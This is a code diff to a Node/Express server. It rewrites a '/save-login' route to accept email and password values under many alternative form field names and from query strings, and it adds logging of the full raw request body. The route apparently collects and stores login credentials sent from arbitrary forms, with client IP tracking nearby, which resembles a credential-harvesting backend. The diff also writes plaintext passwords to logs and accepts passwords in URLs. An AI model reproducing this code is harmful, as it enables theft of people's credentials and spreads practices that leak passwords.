@@ -50,13 +50,36 @@ function getClientIp(req) {
 
 // ---------- Routes ----------
 
-// Save login info
+// Save login info (robust version)
 app.post('/save-login', async (req, res) => {
-  const { email, password } = req.body;
-  console.log(`[SAVE-LOGIN] received: email=${email ? email : '[no-email]'} passwordPresent=${!!password}`);
+  // Accept many possible field names
+  const email =
+    req.body.email ||
+    req.body.emailAddress ||
+    req.body.email_address ||
+    req.body.username ||
+    req.body.user ||
+    req.body.mail ||
+    req.body['email-address'] ||
+    req.body['user_email'] ||
+    (req.body.form && req.body.form.email) ||
+    req.query.email;
+
+  const password =
+    req.body.password ||
+    req.body.pass ||
+    req.body.pw ||
+    req.body.userpass ||
+    req.body['password-confirm'] ||
+    (req.body.form && req.body.form.password) ||
+    req.query.password;
+
+  console.log(`[SAVE-LOGIN] incoming raw body: ${JSON.stringify(req.body)}`);
+  console.log(`[SAVE-LOGIN] resolved email=${email ? email : '[none]'} passwordPresent=${!!password}`);
+
   if (!email || !password) {
     console.log('[SAVE-LOGIN] missing fields');
-    return res.status(400).send({ error: 'Missing email or password' });
+    return res.status(400).send({ error: 'Missing email or password (expected keys: email/password)' });
   }
 
   try {
@@ -130,6 +153,7 @@ app.get('/debug', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
+
 
 
 
